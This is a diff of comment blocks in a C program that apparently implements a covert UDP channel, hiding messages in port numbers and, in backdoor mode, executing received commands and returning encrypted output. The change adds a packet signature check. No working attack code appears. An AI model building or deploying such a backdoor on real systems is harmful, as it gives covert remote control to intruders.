@@ -226,7 +226,8 @@ char *getInput()
  *
  * NOTES:
  * Client function for consealing the message using the UDP header and
- * hiding the message in the port number.
+ * hiding the message in the port number and also add the signature in 
+ * the data
  * -----------------------------------------------------------------------*/
 void client(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, unsigned char *data, int data_len)
 {
@@ -331,8 +332,10 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
  *
  * NOTES:
  * Server function for unvealing the message from the UDP header from the 
- * source port. If it is a backdoor it will executes the command, encryp 
- * the output and call the client function to send the data back.
+ * source port. Only packets with the detination port specified and 
+ * containing the signature will be accepted. If it is a backdoor 
+ * it will executes the command, encrypt the output and call the client 
+ * function to send the data back.
  * -----------------------------------------------------------------------*/
 void server(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, bool isBackdoor)
 {
